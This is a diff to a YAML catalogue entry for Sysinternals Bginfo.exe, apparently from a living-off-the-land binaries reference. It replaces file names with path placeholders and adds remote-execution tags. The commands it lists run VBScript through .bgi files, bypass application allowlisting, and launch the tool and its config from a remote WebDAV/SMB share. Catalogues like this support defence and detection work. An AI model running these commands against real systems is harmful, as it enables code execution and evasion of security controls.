@@ -1,11 +1,11 @@
 ---
 Name: Bginfo.exe
 Description: Background Information Utility included with SysInternals Suite
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: bginfo.exe bginfo.bgi /popup /nolicprompt
-    Description: Execute VBscript code that is referenced within the bginfo.bgi file.
+  - Command: bginfo.exe {PATH:.bgi} /popup /nolicprompt
+    Description: Execute VBscript code that is referenced within the specified .bgi file.
     Usecase: Local execution of VBScript
     Category: Execute
     Privileges: User
@@ -13,8 +13,8 @@ Commands:
     OperatingSystem: Windows
     Tags:
       - Execute: WSH
-  - Command: bginfo.exe bginfo.bgi /popup /nolicprompt
-    Description: Execute VBscript code that is referenced within the bginfo.bgi file.
+  - Command: bginfo.exe {PATH:.bgi} /popup /nolicprompt
+    Description: Execute VBscript code that is referenced within the specified .bgi file.
     Usecase: Local execution of VBScript
     Category: AWL Bypass
     Privileges: User
@@ -22,7 +22,7 @@ Commands:
     OperatingSystem: Windows
     Tags:
       - Execute: WSH
-  - Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
+  - Command: \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
     Usecase: Remote execution of VBScript
     Description: Execute bginfo.exe from a WebDAV server.
     Category: Execute
@@ -31,7 +31,7 @@ Commands:
     Tags:
       - Execute: WSH
     OperatingSystem: Windows
-  - Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
+  - Command: \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
     Usecase: Remote execution of VBScript
     Description: Execute bginfo.exe from a WebDAV server.
     Category: AWL Bypass
@@ -40,7 +40,7 @@ Commands:
     OperatingSystem: Windows
     Tags:
       - Execute: WSH
-  - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
+  - Command: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
     Usecase: Remote execution of VBScript
     Description: This style of execution may not longer work due to patch.
     Category: Execute
@@ -49,7 +49,8 @@ Commands:
     OperatingSystem: Windows
     Tags:
       - Execute: WSH
-  - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
+      - Execute: Remote
+  - Command: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
     Usecase: Remote execution of VBScript
     Description: This style of execution may not longer work due to patch.
     Category: AWL Bypass
@@ -58,6 +59,7 @@ Commands:
     OperatingSystem: Windows
     Tags:
       - Execute: WSH
+      - Execute: Remote
 Full_Path:
   - Path: no default
 Detection:
